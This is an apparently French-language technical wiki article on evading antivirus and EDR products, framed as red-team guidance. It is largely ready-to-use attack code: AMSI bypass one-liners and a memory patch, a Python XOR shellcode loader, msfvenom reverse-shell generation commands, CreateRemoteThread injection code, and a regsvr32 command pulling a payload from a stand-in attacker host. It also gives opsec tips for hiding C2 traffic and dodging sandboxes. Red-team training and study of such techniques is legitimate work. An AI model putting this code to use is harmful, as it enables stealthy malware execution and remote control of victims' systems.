---
title: AV-EDR Evasion
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [evasion, av, edr, amsi, obfuscation, pentest, sécurité]
date: 2026-03-22
---

# AV/EDR Evasion

L'évasion des antivirus (AV) et des Endpoint Detection and Response (EDR) est nécessaire en red team pour simuler des attaquants réels. Les EDR modernes combinent signatures, heuristiques, comportement et télémétrie réseau.

## Comment détectent AV/EDR

```
1. Signatures statiques   : hash de fichier, séquences d'octets connues
2. Heuristiques           : patterns de code suspects (appels API, structure)
3. Analyse comportementale : actions à l'exécution (injection, dumpLSASS, modifications registre)
4. AMSI (Windows)         : analyse du script avant exécution (PowerShell, VBScript, Office macros)
5. Hooks (EDR)            : interception des appels aux fonctions ntdll (NtCreateThread, etc.)
6. ETW (Event Tracing)    : télémétrie kernel des événements système
7. Mémoire                : scan du contenu des processus en cours d'exécution
```

## AMSI Bypass

AMSI (Antimalware Scan Interface) est invoqué avant l'exécution de scripts PowerShell, VBScript, etc.

```powershell
# AMSI transmet les scripts à l'AV pour analyse avant exécution
# Si bloqué → "This script contains malicious content"

# Bypass 1 — corruption de la structure AMSI en mémoire (version classique)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Bypass 2 — patch de la fonction AmsiScanBuffer
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiContext', 'NonPublic,Static')
$c = $b.GetValue($null)
[IntPtr]$ptr = $c
$bytes = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax, 0x80070057; ret
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, 6)

# Bypass 3 — obfuscation du bypass lui-même
# Concaténation de chaînes pour éviter la détection du bypass
$a='System.Management.Automation'
$b='AmsiUtils'
[Ref].Assembly.GetType("$a.$b").GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Forcer le mode sans contrainte (si LocalMachine policy n'est pas restreinte)
Set-ExecutionPolicy Bypass -Scope Process
```

## Obfuscation de scripts PowerShell

```powershell
# Encodage Base64 (basique, détecté par les AV modernes)
$command = "Get-Process"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
powershell -EncodedCommand $encoded

# Invoke-Obfuscation — outil d'obfuscation avancé
Install-Module Invoke-Obfuscation
Invoke-Obfuscation
# Token, AST, Encoding, Launcher, Compress...
# → Transforme le script en version quasi-illisible mais fonctionnelle

# Obfuscation manuelle par concaténation
$cmd = 'Ge' + 't-Proce' + 'ss'    # "Get-Process" en fragments
& ($cmd)

# Backtick escape
G`e`t`-`P`r`o`c`e`s`s             # Ignoré par PowerShell

# Variables et substitution
${env:COMSPEC}                      # C:\Windows\System32\cmd.exe
& ([string]::Join('', ('G','e','t','-','P','r','o','c','e','s','s')))
```

## Shellcode — éviter les signatures statiques

```python
# Encodage XOR du shellcode
import os

key = 0x41
shellcode = b"\xfc\x48\x83\xe4..."  # shellcode msfvenom

encoded = bytes([b ^ key for b in shellcode])

# Loader Python (decode et exécute)
import ctypes, os
key = 0x41
shellcode = bytes([b ^ key for b in encoded_shellcode])
buf = (ctypes.c_char * len(shellcode))(*shellcode)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, len(shellcode))
thread = ctypes.windll.kernel32.CreateThread(None, 0, ctypes.c_void_p(ptr), None, 0, None)
ctypes.windll.kernel32.WaitForSingleObject(thread, -1)
```

### Msfvenom avec encodeurs

```bash
# Encodeur shikata_ga_nai (polymorphique)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
    -e x64/xor_dynamic -i 5 -f exe -o payload.exe

# Format PowerShell en mémoire (sans toucher au disque)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f ps1 -o payload.ps1

# Générer en C pour compilation manuelle avec obfuscation
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f c -o shellcode.c
```

## Process Injection

Injecter du code dans un processus légitime pour masquer l'exécution.

```c
// CreateRemoteThread — injection classique
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
LPVOID pRemoteAddr = VirtualAllocEx(hProcess, NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteAddr, shellcode, shellcode_size, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
```

```csharp
// Process Hollowing — créer un processus suspendu, remplacer son code
// 1. CreateProcess avec CREATE_SUSPENDED
// 2. Lire et vider la mémoire de la section principale (NtUnmapViewOfSection)
// 3. Allouer de la mémoire et écrire le payload
// 4. Modifier le contexte du thread (EIP/RIP pointe vers le payload)
// 5. ResumeThread → le processus exécute notre payload

// DLL Injection via LoadLibrary
// 1. VirtualAllocEx → écrire le chemin de la DLL
// 2. CreateRemoteThread → appeler LoadLibraryA avec le chemin
// → La DLL légitime est chargée dans le processus cible
```

## Bypass des hooks EDR (Syscall directs)

Les EDR hookent les fonctions de ntdll.dll (couche user) pour intercepter les appels. Les syscalls directs contournent ces hooks en appelant le kernel directement.

```c
// Les EDR hookent : NtCreateThread, NtAllocateVirtualMemory, NtWriteVirtualMemory...
// → Patch dans ntdll.dll pour insérer un JMP vers leur code de monitoring

// Bypass 1 — Unhooking ntdll
// Recharger ntdll.dll depuis le disque (version non hookée)
// et remplacer la copie en mémoire

// Bypass 2 — Syscalls directs (Syswhispers)
// Appeler le syscall numéro directement (int 0x2e ou syscall instruction)
// sans passer par ntdll.dll

// Bypass 3 — Heaven's Gate (32→64 bit switch)
// Appeler des fonctions 64-bit depuis un processus 32-bit via le segment 0x33

// Outils : SysWhispers2/SysWhispers3, Halo's Gate, Tartarus Gate
```

## Formats de fichiers et delivery

```bash
# HTA (HTML Application) — exécuté par mshta.exe
cat payload.hta
# <html><head><script language="VBScript">
# CreateObject("WScript.Shell").Run "cmd /c ..."
# </script></head></html>

# SCT (COM Scriptlet) — via regsvr32.exe (bypass AppLocker)
regsvr32 /s /n /u /i:http://attaquant.com/payload.sct scrobj.dll

# Office macros (Word/Excel)
# Payload dans AutoOpen() / Workbook_Open()
# → Désactivé par défaut depuis 2022 (Microsoft désactive les macros externe)
# → Bypass : macros avec signature numérique, ou vecteurs alternatifs

# LNK (raccourci Windows)
# Modifier la cible du raccourci pour exécuter une commande
# Vecteur utilisé par de nombreux malwares (distribution par phishing)

# ISO / VHD (contourne MOTW — Mark of the Web)
# Les fichiers dans une image ISO n'ont pas le flag "téléchargé depuis internet"
# → Les macros s'exécutent sans popup de sécurité (avant les patches 2022-2023)
```

## Outils de génération de payloads évasifs

```bash
# Villain — framework C2 avec génération de payloads obfusqués
# Havoc C2 — framework moderne avec support des syscalls directs
# Sliver C2 — Go-based C2 avec mTLS, DNS, HTTP(S) staging
# Brute Ratel — commercial, très évasif
# Cobalt Strike — référence commerciale du red team

# Outils de bypass AMSI
# AMSITrigger — identifier les patterns qui déclenchent l'AMSI
AMSITrigger.exe -i payload.ps1

# DefenderCheck — trouver les bytes qui déclenchent Defender
DefenderCheck.exe payload.exe
```

## Opsec — bonnes pratiques red team

```
- Ne jamais écrire du shellcode sur le disque → injection en mémoire uniquement
- Utiliser des processus légitimes comme parent (explorer.exe, svchost.exe)
- Eviter Mimikatz en clair (signatures connues) → utiliser des alternatives (Rubeus, pypykatz)
- Communications C2 sur HTTPS avec un domaine categorisé (vieux domaine, certificat valide)
- Interval de beacon aléatoire (jitter) pour éviter la détection de beaconing régulier
- Sleep avant exécution du payload (évite les sandboxes qui ont un timeout)
- Vérifier l'environnement avant l'exécution (est-ce une sandbox ?)
```
